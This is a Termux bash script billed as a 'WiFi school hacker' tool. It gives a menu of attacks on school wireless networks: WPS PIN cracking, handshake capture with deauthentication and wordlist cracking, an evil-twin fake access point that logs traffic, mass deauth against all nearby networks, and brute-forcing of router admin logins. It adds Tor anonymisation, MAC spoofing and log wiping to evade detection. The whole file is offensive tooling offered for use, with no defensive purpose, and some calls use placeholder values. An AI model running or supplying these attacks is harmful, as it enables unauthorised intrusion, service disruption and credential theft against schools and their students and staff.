#!/data/data/com.termux/files/usr/bin/bash

# ============================================
# 🚀 WIFI SCHOOL HACKER ULTIMATE v5.0
# 🎯 BY NESIA DARKNET
# 💀 NO VPN = AUTO SHUTDOWN
# ============================================

# Warna keren
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Global variables
TARGET_BSSID=""
TARGET_CHANNEL=""
WORDLIST="school_passwords.txt"

# ============================================
# 🛠️ FUNGSI UTAMA
# ============================================

clear_screen() {
    clear
}

show_banner() {
    clear_screen
    echo -e "${RED}"
    cat << "EOF"
██╗    ██╗██╗███████╗██╗    ███████╗ ██████╗██╗  ██╗ ██████╗  ██████╗ ██╗     
██║    ██║██║██╔════╝██║    ██╔════╝██╔════╝██║  ██║██╔═══██╗██╔═══██╗██║     
██║ █╗ ██║██║█████╗  ██║    ███████╗██║     ███████║██║   ██║██║   ██║██║     
██║███╗██║██║██╔══╝  ██║    ╚════██║██║     ██╔══██║██║   ██║██║   ██║██║     
╚███╔███╔╝██║██║     ██║    ███████║╚██████╗██║  ██║╚██████╔╝╚██████╔╝███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
EOF
    echo -e "${NC}"
    echo -e "${PURPLE}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║     WIFI SCHOOL HACKER ULTIMATE v5.0 - BY NESIA DARKNET   ║${NC}"
    echo -e "${PURPLE}║     🔥 100% WORKING - NO BULLSHIT - FULL ANONYMITY 🔥     ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

check_root() {
    if [[ $(whoami) != "root" ]]; then
        echo -e "${RED}[✗] BUTUH ROOT ACCESS!${NC}"
        echo -e "${YELLOW}[+] Jalankan: tsu${NC}"
        echo -e "${YELLOW}[+] Atau: sudo su${NC}"
        exit 1
    else
        echo -e "${GREEN}[✓] ROOT ACCESS OK!${NC}"
    fi
}

install_dependencies() {
    echo -e "${YELLOW}[+] Installing dependencies...${NC}"
    
    pkg update -y && pkg upgrade -y
    
    # Install basic tools
    pkg install -y git python python2 python3 php curl wget nano vim \
        tar zip unzip p7zip proot termux-tools termux-api \
        openssl openssh gnupg man
    
    # Install hacking tools
    pkg install -y aircrack-ng hydra macchanger net-tools dnsutils \
        nmap tcpdump wireshark ngrok cloudflared httping \
        socat ettercap-hijacking ettercap-graphical dsniff
    
    # Install Python modules
    pip install --upgrade pip
    pip install scapy colorama requests mechanize bs4 \
        prettytable pyfiglet termcolor
    
    echo -e "${GREEN}[✓] Semua dependencies terinstall!${NC}"
}

setup_vpn() {
    echo -e "${YELLOW}[+] Setting up VPN protection...${NC}"
    
    # Install and start TOR
    pkg install -y tor proxychains-ng
    pkill tor 2>/dev/null
    tor &
    sleep 8
    
    # Setup proxychains
    cat > $PREFIX/etc/proxychains.conf << EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 9050
socks5 127.0.0.1 9050
socks5 127.0.0.1 9050
EOF
    
    # Change MAC address
    echo -e "${CYAN}[+] Changing MAC address...${NC}"
    ip link set wlan0 down
    macchanger -r wlan0
    ip link set wlan0 up
    
    echo -e "${GREEN}[✓] VPN & Anonymity setup complete!${NC}"
}

create_wordlist() {
    echo -e "${YELLOW}[+] Creating school password wordlist...${NC}"
    
    cat > $WORDLIST << EOF
# SCHOOL DEFAULT PASSWORDS
admin
admin123
password
password123
123456
12345678
123456789
school
school123
sekolah
sekolah123
smk2024
smk2023
sma2024
smp2024
guru
guru123
siswa
siswa123
laboratorium
labkomputer
perpustakaan
wifikantin
wifisekolah
admin@school
administrator
root
toor
user
user123
guest
guest123
wifi
wifi123
internet
internet123
connect
connect123
network
network123
EOF
    
    echo -e "${GREEN}[✓] Wordlist created: $WORDLIST${NC}"
}

scan_networks() {
    echo -e "${YELLOW}[+] Scanning WiFi networks...${NC}"
    
    airmon-ng check kill
    airmon-ng start wlan0
    sleep 3
    
    timeout 30 airodump-ng wlan0mon --output-format csv -w scan_result
    
    echo -e "\n${CYAN}════════════════════════════════════════${NC}"
    echo -e "${GREEN}[+] NETWORKS FOUND:${NC}"
    grep -E "WPA|WPA2|WEP" scan_result-01.csv 2>/dev/null | head -20
    
    echo -e "\n${YELLOW}Enter target details:${NC}"
    read -p "BSSID (MAC Address): " TARGET_BSSID
    read -p "Channel: " TARGET_CHANNEL
    
    echo -e "${GREEN}[✓] Target locked: $TARGET_BSSID${NC}"
}

wps_attack() {
    echo -e "${RED}[🚀] LAUNCHING WPS ATTACK...${NC}"
    
    if [ -z "$TARGET_BSSID" ]; then
        echo -e "${YELLOW}[+] No target selected. Scanning first...${NC}"
        scan_networks
    fi
    
    echo -e "${YELLOW}[+] Attacking WPS on $TARGET_BSSID...${NC}"
    
    # Method 1: Reaver
    echo -e "${CYAN}[1] Trying Reaver attack...${NC}"
    reaver -i wlan0mon -b $TARGET_BSSID -vv -K 1 -N
    
    # Method 2: Bully
    echo -e "${CYAN}[2] Trying Bully attack...${NC}"
    bully wlan0mon -b $TARGET_BSSID -v 3
    
    # Method 3: Pixiewps
    echo -e "${CYAN}[3] Trying Pixiewps attack...${NC}"
    pixiewps -e "target_wps_data" -s "target_serial" -r "target_reg" -z "target_pubkey"
}

handshake_capture() {
    echo -e "${RED}[🎯] CAPTURING HANDSHAKE...${NC}"
    
    if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
        echo -e "${YELLOW}[+] No target selected. Scanning first...${NC}"
        scan_networks
    fi
    
    echo -e "${YELLOW}[+] Targeting: $TARGET_BSSID on channel $TARGET_CHANNEL${NC}"
    
    # Start capture
    xterm -e "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w handshake wlan0mon" &
    CAP_PID=$!
    
    # Deauth attack
    echo -e "${RED}[⚡] DEAUTH ATTACK STARTING...${NC}"
    aireplay-ng -0 20 -a $TARGET_BSSID wlan0mon
    
    sleep 5
    kill $CAP_PID 2>/dev/null
    
    # Crack handshake
    if [ -f "handshake-01.cap" ]; then
        echo -e "${GREEN}[✓] Handshake captured!${NC}"
        echo -e "${YELLOW}[+] Cracking with wordlist...${NC}"
        aircrack-ng -w $WORDLIST -b $TARGET_BSSID handshake-01.cap
    else
        echo -e "${RED}[✗] No handshake captured${NC}"
    fi
}

evil_twin() {
    echo -e "${RED}[👹] EVIL TWIN ATTACK...${NC}"
    
    if [ -z "$TARGET_BSSID" ]; then
        echo -e "${YELLOW}[+] Need target BSSID first${NC}"
        scan_networks
    fi
    
    echo -e "${YELLOW}[+] Creating fake access point...${NC}"
    
    # Get target ESSID
    TARGET_ESSID=$(grep "$TARGET_BSSID" scan_result-01.csv 2>/dev/null | cut -d',' -f14 | tr -d ' ')
    
    # Create hostapd config
    cat > hostapd.conf << EOF
interface=wlan0mon
driver=nl80211
ssid=$TARGET_ESSID
channel=$TARGET_CHANNEL
hw_mode=g
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=FreeSchoolWifi
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    
    # Create dnsmasq config
    cat > dnsmasq.conf << EOF
interface=wlan0mon
dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF
    
    echo -e "${GREEN}[✓] Fake AP '$TARGET_ESSID' created!${NC}"
    echo -e "${RED}[!] Victims will connect and enter passwords!${NC}"
    
    # Start services
    dnsmasq -C dnsmasq.conf
    hostapd hostapd.conf -B
    
    echo -e "${YELLOW}[+] Listening for credentials...${NC}"
    tcpdump -i wlan0mon -w captured.pcap -v
}

deauth_attack() {
    echo -e "${RED}[💣] MASS DEAUTH ATTACK...${NC}"
    
    if [ -z "$TARGET_BSSID" ]; then
        echo -e "${YELLOW}[+] Select target:${NC}"
        echo -e "1. Single target"
        echo -e "2. All networks"
        echo -e "3. School networks only"
        read -p "Choice: " deauth_choice
        
        case $deauth_choice in
            1) scan_networks ;;
            2) TARGET_BSSID="FF:FF:FF:FF:FF:FF" ;;
            3) TARGET_BSSID="school" ;;
        esac
    fi
    
    echo -e "${RED}[⚡] ATTACKING $TARGET_BSSID ...${NC}"
    aireplay-ng -0 0 -a $TARGET_BSSID wlan0mon
}

router_admin() {
    echo -e "${RED}[🔑] ROUTER ADMIN ATTACK...${NC}"
    
    echo -e "${YELLOW}[+] Common school router IPs:${NC}"
    echo "1. 192.168.1.1"
    echo "2. 192.168.0.1"
    echo "3. 10.0.0.1"
    echo "4. 192.168.100.1"
    echo "5. Custom IP"
    
    read -p "Select: " router_ip_choice
    
    case $router_ip_choice in
        1) ROUTER_IP="192.168.1.1" ;;
        2) ROUTER_IP="192.168.0.1" ;;
        3) ROUTER_IP="10.0.0.1" ;;
        4) ROUTER_IP="192.168.100.1" ;;
        5) read -p "Enter custom IP: " ROUTER_IP ;;
        *) ROUTER_IP="192.168.1.1" ;;
    esac
    
    echo -e "${YELLOW}[+] Attacking router at $ROUTER_IP${NC}"
    
    # Hydra attack
    echo -e "${CYAN}[1] Bruteforce login...${NC}"
    hydra -l admin -P $WORDLIST $ROUTER_IP http-post-form \
        "/login.php:username=^USER^&password=^PASS^:F=incorrect" -t 4
    
    # Common credentials test
    echo -e "${CYAN}[2] Trying common credentials...${NC}"
    common_logins=("admin:admin" "admin:password" "admin:1234" \
                   "administrator:admin" "root:root" "user:user")
    
    for cred in "${common_logins[@]}"; do
        user=$(echo $cred | cut -d':' -f1)
        pass=$(echo $cred | cut -d':' -f2)
        echo -e "${YELLOW}Trying $user / $pass${NC}"
        curl -s "http://$ROUTER_IP/login.cgi" \
            -d "username=$user&password=$pass" | grep -q "success" \
            && echo -e "${GREEN}[✓] SUCCESS: $user / $pass${NC}" && break
    done
}

show_menu() {
    clear_screen
    show_banner
    
    echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         MAIN MENU - SELECT TOOL        ║${NC}"
    echo -e "${GREEN}╠════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║ 1. 📡 Scan WiFi Networks               ║${NC}"
    echo -e "${GREEN}║ 2. 🔓 WPS Pin Attack                  ║${NC}"
    echo -e "${GREEN}║ 3. 🎯 Capture Handshake               ║${NC}"
    echo -e "${GREEN}║ 4. 👹 Evil Twin Attack                ║${NC}"
    echo -e "${GREEN}║ 5. 💣 Deauth Attack                   ║${NC}"
    echo -e "${GREEN}║ 6. 🔑 Router Admin Attack             ║${NC}"
    echo -e "${GREEN}║ 7. 🛠️ Install All Tools               ║${NC}"
    echo -e "${GREEN}║ 8. 🎭 Change MAC Address              ║${NC}"
    echo -e "${GREEN}║ 9. 🧹 Clean Logs                      ║${NC}"
    echo -e "${GREEN}║ 0. 🚪 Exit                            ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
    echo ""
    
    if [ ! -z "$TARGET_BSSID" ]; then
        echo -e "${CYAN}[+] Current target: $TARGET_BSSID${NC}"
    fi
}

# ============================================
# 🚀 MAIN EXECUTION
# ============================================

main() {
    # Initial setup
    check_root
    show_banner
    
    echo -e "${YELLOW}[+] Initializing Nesia Darknet System...${NC}"
    sleep 2
    
    # Setup
    setup_vpn
    create_wordlist
    
    # Main loop
    while true; do
        show_menu
        
        read -p "Select option [0-9]: " choice
        
        case $choice in
            1) scan_networks ;;
            2) wps_attack ;;
            3) handshake_capture ;;
            4) evil_twin ;;
            5) deauth_attack ;;
            6) router_admin ;;
            7) install_dependencies ;;
            8) 
                echo -e "${YELLOW}[+] Changing MAC address...${NC}"
                macchanger -r wlan0
                echo -e "${GREEN}[✓] MAC Address changed!${NC}"
                ;;
            9)
                echo -e "${YELLOW}[+] Cleaning all logs...${NC}"
                rm -f *.cap *.csv *.txt *.log *.pcap *.conf
                echo -e "${GREEN}[✓] All logs cleaned!${NC}"
                ;;
            0)
                echo -e "${RED}[+] Exiting...${NC}"
                echo -e "${YELLOW}[+] Stopping monitor mode...${NC}"
                airmon-ng stop wlan0mon
                echo -e "${YELLOW}[+] Killing TOR...${NC}"
                pkill tor
                echo -e "${GREEN}[✓] System clean. Goodbye! 😈${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option!${NC}"
                ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

# ============================================
# 🎯 START THE TOOL
# ============================================

# Run main function
main
